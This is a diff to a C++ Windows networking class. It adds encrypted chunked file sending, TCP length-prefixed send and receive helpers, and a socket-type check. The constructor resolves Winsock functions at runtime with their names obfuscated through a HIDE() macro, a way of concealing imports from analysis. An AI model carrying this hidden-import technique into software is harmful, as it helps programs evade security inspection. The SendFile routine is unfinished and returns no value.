@@ -4,6 +4,100 @@
 
 #include <vector>
 
+bool NetworkManager::SendFile(File& file, SOCKET s, BYTESTRING& aesKey) {
+    std::cout << "Were going to try and send a file. " << std::endl;
+
+    const int   packetBufferSize = MAX_BUFFER_LEN - 20; // Comfortable buffer size, dont wanna fill it fully
+    std::string contents         = file.ReadFrom();
+    ULONG       fileSize         = file.GetFileSize();
+    ULONG       readBytes        = 0; // out of 'toRead' how many bytes have been read from contents
+    int         packetsToSend    = std::ceil(file.GetFileSize() / (double)packetBufferSize ); /* Leave some room to be safe */ 
+    int         packets          = 0; // packets sent
+    Packet      toSend;
+    BYTESTRING  grouped; // grouped and encrypted packets
+
+    auto start = std::chrono::high_resolution_clock::now();
+
+    /*
+        Takes ~460ms to send a 100 MB file without standard output :(
+    */
+    while ( readBytes < fileSize ) // while we still need to read
+    {
+        //std::cout << "Read bytes: " << readBytes << std::endl;
+        //std::cout << "Packets sent: " << packets << std::endl;
+        
+        if ( readBytes + packetBufferSize >= fileSize )
+            toSend.insert(std::string(contents.begin() + readBytes, contents.end()));
+        else
+            toSend.insert(std::string(contents.begin() + readBytes, contents.begin() + readBytes + packetBufferSize));
+
+        packets++;
+        readBytes += toSend.buffLen;
+
+        BYTESTRING encrypted = LGCrypto::EncryptStruct<Packet>(toSend, aesKey, LGCrypto::GenerateAESIV());
+        grouped.insert(grouped.end(), encrypted.begin(), encrypted.end());
+    }
+
+    auto end = std::chrono::high_resolution_clock::now();
+    auto dur = end - start;
+    long long final = std::chrono::duration_cast<std::chrono::milliseconds>(dur).count();
+
+    std::cout << "Read bytes: " << readBytes << std::endl;
+    std::cout << "Sent over " << packets << " packets" << std::endl;
+    std::cout << "Size of all encrypted packets " << grouped.size() << std::endl;
+    std::cout << "Took " << final << " ms" << std::endl;
+
+    // Todo: send tcp large data to 's'
+}
+
+bool NetworkManager::SendTCPLargeData(const BYTESTRING& message, SOCKET s) {
+    if ( !IsTCPSocket(s) ) return false;
+
+    int toSend = message.size();
+    int bytesSent = 0;
+
+    int sent = Send(s, ( char* ) &toSend, sizeof(toSend), 0);
+    if ( sent <= 0 )
+        return false;
+
+    while ( bytesSent < toSend ) {
+        sent = Send(s, ( char* ) message.data() + bytesSent, toSend - bytesSent, 0);
+
+        if ( sent <= 0 )
+            return false;
+
+        bytesSent += sent;
+    }
+    return true;
+}
+
+bool NetworkManager::ReceiveTCPLargeData(BYTESTRING& data, SOCKET s)
+{
+    if ( !IsTCPSocket(s) ) return false;
+
+    int toReceive = 0;
+    BYTESTRING buffer;
+    int bytesReceived = 0;
+
+    int received = Receive(s, ( char* ) &toReceive, sizeof(toReceive), 0);
+
+    if ( received <= 0 )
+        return false;
+
+    buffer.resize(toReceive);
+
+    while ( bytesReceived < toReceive ) {
+        received = Receive(s, ( char* ) buffer.data() + bytesReceived, toReceive - bytesReceived, 0);
+
+        if ( received <= 0 )
+            return false;
+
+        bytesReceived += received;
+    }
+    data = buffer;
+    return true;
+}
+
 bool NetworkManager::TransmitRSAKey(SOCKET s, RSA* key, bool isPrivateKey) {
     if ( !key )
         return false;
@@ -16,6 +110,17 @@ bool NetworkManager::TransmitRSAKey(SOCKET s, RSA* key, bool isPrivateKey) {
         return false;
 
     return true;
+}
+
+bool NetworkManager::IsTCPSocket(SOCKET s) {
+    int type, optLen;
+    optLen = sizeof(type);
+
+    GetSocketOptions(s, SOL_SOCKET, SO_TYPE, ( char* ) &type, &optLen);
+    if ( type == SOCK_STREAM )
+        return true;
+
+    return false;
 }
 
 NetworkManager::NetworkManager() {
@@ -55,7 +160,7 @@ NetworkManager::NetworkManager() {
     HostToNetworkLong = ProcessManager::GetFunctionAddress<_htonl>(WINSOCK, std::string(HIDE("htonl")));
     NetworkToHostLong = ProcessManager::GetFunctionAddress<_ntohl>(WINSOCK, std::string(HIDE("ntohl")));
     SetSocketOptions = ProcessManager::GetFunctionAddress<_setsocketopt>(WINSOCK, std::string(HIDE("setsockopt")));
-
+    GetSocketOptions = ProcessManager::GetFunctionAddress<_getsocketopt>(WINSOCK, std::string(HIDE("getsockopt")));
 
     WORD    version = MAKEWORD(2, 2);
     WSAData data = { 0 };
